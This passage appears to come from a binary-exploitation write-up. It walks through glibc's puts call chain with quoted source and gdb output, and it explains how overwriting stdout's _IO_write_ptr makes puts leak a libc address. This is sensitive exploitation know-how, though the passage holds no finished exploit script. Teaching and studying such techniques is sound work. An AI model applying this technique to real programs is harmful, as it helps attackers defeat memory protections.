</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> must_flush <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  size_t count <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (to_do <span style="color:#555">+</span> must_flush <span style="color:#555">&gt;</span> <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      size_t block_size, do_write;
</span></span><span style="display:flex;"><span>      <span style="color:#09f;font-style:italic">/* Next flush the (full) buffer. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (_IO_OVERFLOW (f, EOF) <span style="color:#555">==</span> EOF)
</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">/* If nothing else has to be written we must not signal the
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">	   caller that everything has been written.  */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">return</span> to_do <span style="color:#555">==</span> <span style="color:#f60">0</span> <span style="color:#555">?</span> <span style="color:#99f">EOF</span> : n <span style="color:#555">-</span> to_do;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#09f;font-style:italic">/* Try to maintain alignment: write a whole number of blocks.  */</span>
</span></span><span style="display:flex;"><span>      block_size <span style="color:#555">=</span> f<span style="color:#555">-&gt;</span>_IO_buf_end <span style="color:#555">-</span> f<span style="color:#555">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>      do_write <span style="color:#555">=</span> to_do <span style="color:#555">-</span> (block_size <span style="color:#555">&gt;=</span> <span style="color:#f60">128</span> <span style="color:#555">?</span> to_do <span style="color:#555">%</span> <span style="color:#99f">block_size</span> : <span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (do_write)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  count <span style="color:#555">=</span> new_do_write (f, s, do_write);
</span></span><span style="display:flex;"><span>	  to_do <span style="color:#555">-=</span> count;
</span></span><span style="display:flex;"><span>	  <span style="color:#069;font-weight:bold">if</span> (count <span style="color:#555">&lt;</span> do_write)
</span></span><span style="display:flex;"><span>	    <span style="color:#069;font-weight:bold">return</span> n <span style="color:#555">-</span> to_do;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you read the code, it will call <code>_IO_OVERFLOW(f, EOF)</code> before calling <code>new_do_write</code> to write the actual string that we want to print. Based on the <code>vtable</code> above that we see in gdb (the <code>_IO_file_jumps</code>), calling <code>_IO_OVERFLOW</code> equivalents to jump to <code>_IO_new_file_overflow</code>. Let&rsquo;s check the disassembly result of that method.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span>
</span></span><span style="display:flex;"><span><span style="color:#c0f">_IO_new_file_overflow</span> (FILE <span style="color:#555">*</span>f, <span style="color:#078;font-weight:bold">int</span> ch)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (f<span style="color:#555">-&gt;</span>_flags <span style="color:#555">&amp;</span> _IO_NO_WRITES) <span style="color:#09f;font-style:italic">/* SET ERROR */</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      f<span style="color:#555">-&gt;</span>_flags <span style="color:#555">|=</span> _IO_ERR_SEEN;
</span></span><span style="display:flex;"><span>      __set_errno (EBADF);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">return</span> EOF;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#09f;font-style:italic">/* If currently reading or no buffer allocated. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((f<span style="color:#555">-&gt;</span>_flags <span style="color:#555">&amp;</span> _IO_CURRENTLY_PUTTING) <span style="color:#555">==</span> <span style="color:#f60">0</span> <span style="color:#555">||</span> f<span style="color:#555">-&gt;</span>_IO_write_base <span style="color:#555">==</span> <span style="color:#366">NULL</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (ch <span style="color:#555">==</span> EOF)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> _IO_do_write (f, f<span style="color:#555">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>			 f<span style="color:#555">-&gt;</span>_IO_write_ptr <span style="color:#555">-</span> f<span style="color:#555">-&gt;</span>_IO_write_base);
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
</span></span></code></pre></td></tr></table>
</div>
</div><p>During calling this method, keep in mind first that the passed argument for <code>ch</code> is <code>EOF</code>. And notice this interesting LOC:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (ch <span style="color:#555">==</span> EOF)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> _IO_do_write (f, f<span style="color:#555">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>			 f<span style="color:#555">-&gt;</span>_IO_write_ptr <span style="color:#555">-</span> f<span style="color:#555">-&gt;</span>_IO_write_base);
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we disassemble <code>_IO_do_write</code> method and try to trace the method calls inside of it:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span>
</span></span><span style="display:flex;"><span><span style="color:#c0f">_IO_new_do_write</span> (FILE <span style="color:#555">*</span>fp, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>data, size_t to_do)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> (to_do <span style="color:#555">==</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>	  <span style="color:#555">||</span> (size_t) new_do_write (fp, data, to_do) <span style="color:#555">==</span> to_do) <span style="color:#555">?</span> <span style="color:#f60">0</span> <span style="color:#555">:</span> EOF;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>libc_hidden_ver (_IO_new_do_write, _IO_do_write)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> size_t
</span></span><span style="display:flex;"><span>new_do_write (FILE <span style="color:#555">*</span>fp, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>data, size_t to_do)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  size_t count;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (fp<span style="color:#555">-&gt;</span>_flags <span style="color:#555">&amp;</span> _IO_IS_APPENDING)
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">/* On a system without a proper O_APPEND implementation,
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">       you would need to sys_seek(0, SEEK_END) here, but is
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">       not needed nor desirable for Unix- or Posix-like systems.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">       Instead, just indicate that offset (before and after) is
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">       unpredictable. */</span>
</span></span><span style="display:flex;"><span>    fp<span style="color:#555">-&gt;</span>_offset <span style="color:#555">=</span> _IO_pos_BAD;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> <span style="color:#c0f">if</span> (fp<span style="color:#555">-&gt;</span>_IO_read_end <span style="color:#555">!=</span> fp<span style="color:#555">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      off64_t new_pos
</span></span><span style="display:flex;"><span>	<span style="color:#555">=</span> _IO_SYSSEEK (fp, fp<span style="color:#555">-&gt;</span>_IO_write_base <span style="color:#555">-</span> fp<span style="color:#555">-&gt;</span>_IO_read_end, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (new_pos <span style="color:#555">==</span> _IO_pos_BAD)
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>      fp<span style="color:#555">-&gt;</span>_offset <span style="color:#555">=</span> new_pos;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  count <span style="color:#555">=</span> _IO_SYSWRITE (fp, data, to_do);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#099">#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ssize_t
</span></span><span style="display:flex;"><span>_IO_new_file_write (FILE <span style="color:#555">*</span>f, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>data, ssize_t n)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ssize_t to_do <span style="color:#555">=</span> n;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span> (to_do <span style="color:#555">&gt;</span> <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      ssize_t count <span style="color:#555">=</span> (__builtin_expect (f<span style="color:#555">-&gt;</span>_flags2
</span></span><span style="display:flex;"><span>                                         <span style="color:#555">&amp;</span> _IO_FLAGS2_NOTCANCEL, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>			   <span style="color:#555">?</span> __write_nocancel (f<span style="color:#555">-&gt;</span>_fileno, data, to_do)
</span></span><span style="display:flex;"><span>			   <span style="color:#555">:</span> __write (f<span style="color:#555">-&gt;</span>_fileno, data, to_do));
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (count <span style="color:#555">&lt;</span> <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  f<span style="color:#555">-&gt;</span>_flags <span style="color:#555">|=</span> _IO_ERR_SEEN;
</span></span><span style="display:flex;"><span>	  <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>      to_do <span style="color:#555">-=</span> count;
</span></span><span style="display:flex;"><span>      data <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>) ((<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>) data <span style="color:#555">+</span> count);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  n <span style="color:#555">-=</span> to_do;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (f<span style="color:#555">-&gt;</span>_offset <span style="color:#555">&gt;=</span> <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>    f<span style="color:#555">-&gt;</span>_offset <span style="color:#555">+=</span> n;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> n;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, <code>_IO_do_write</code> is an alias to <code>_IO_new_do_write</code>, which eventually will call <code>new_do_write</code>, and finally, it will call <code>_IO_SYSWRITE (fp, data, to_do)</code>. <code>_IO_SYSWRITE</code> will jump to the <code>vtable</code> stored pointer mapped from key <code>__write</code>, which based on the <code>vtable</code> that we saw before in <code>stdout</code>, is equivalent to calling <code>_IO_new_file_write</code>. And finally, this method will call <code>write(f-&gt;fileno, data, to_do)</code></p>
<p>To summarize, below are the possible chain calls that we can trigger when we call <code>puts</code>:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>puts(str)
</span></span><span style="display:flex;"><span>|_ _IO_new_file_xsputn (stdout, str, len)
</span></span><span style="display:flex;"><span>   |_ _IO_new_file_overflow (stdout, EOF)
</span></span><span style="display:flex;"><span>      |_ new_do_write(stdout, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)
</span></span><span style="display:flex;"><span>         |_ _IO_new_file_write(stdout, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)
</span></span><span style="display:flex;"><span>            |_ write(stdout-&gt;fileno, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see from the chain summary, during calling <code>_IO_OVERFLOW</code> inside the <code>puts</code> method, there is a possibility that we can call <code>write(stdout-&gt;fileno, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)</code>.</p>
<p>Back to the <code>gdb</code> result of <code>stdout</code> that we see before, <code>stdout-&gt;fileno</code> is <code>1</code> and both <code>stdout-&gt;_IO_write_base</code> and <code>stdout-&gt;_IO_write_ptr</code> are currently pointing to the same address, and the address is part of the libc region. Taking the <code>stdout-&gt;_IO_write_base</code> address from the previous <code>gdb</code> result (which is <code>0x7ffff7fae803</code>), let&rsquo;s inspect on what is the content of the address.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  tele 0x7ffff7fae803
</span></span><span style="display:flex;"><span>0x00007ffff7fae803│+0x0000: 0xfafa70000000000a (&#34;\n&#34;?)
</span></span><span style="display:flex;"><span>0x00007ffff7fae80b│+0x0008: 0xffffff00007ffff7
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>gef➤  tele 0x7ffff7fae803+5
</span></span><span style="display:flex;"><span>0x00007ffff7fae808│+0x0000: 0x00007ffff7fafa70  →  0x0000000000000000
</span></span><span style="display:flex;"><span>0x00007ffff7fae810│+0x0008: 0xffffffffffffffff
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, there is a libc address inside the address pointed by the <code>_IO_write_base</code>, specifically <code>_IO_write_base+5</code>. So, if we&rsquo;re somehow able to overwrite the <code>_IO_write_ptr</code> address of the <code>stdout</code>, so that it won&rsquo;t be pointing to the same address as <code>_IO_write_base</code> (making <code>_IO_write_ptr &gt; _IO_write_base</code>), we will get a libc leak during calling <code>puts</code>, because when <code>puts</code> called <code>_IO_OVERFLOW</code>, it will eventually call <code>write(1, _IO_write_base, _IO_write_ptr - _IO_write_base)</code>, which instructing it to print the content between the range of the <code>_IO_write_ptr</code> and <code>_IO_write_base</code>.</p>
<p>However, notes that there are some constraints that we need to fulfill so that we can successfully execute that chain:</p>
<ul>
<li>During calling <code>_IO_new_file_overflow</code>, notice that we need to bypass these checks before calling the <code>_IO_do_write</code>:
<ul>
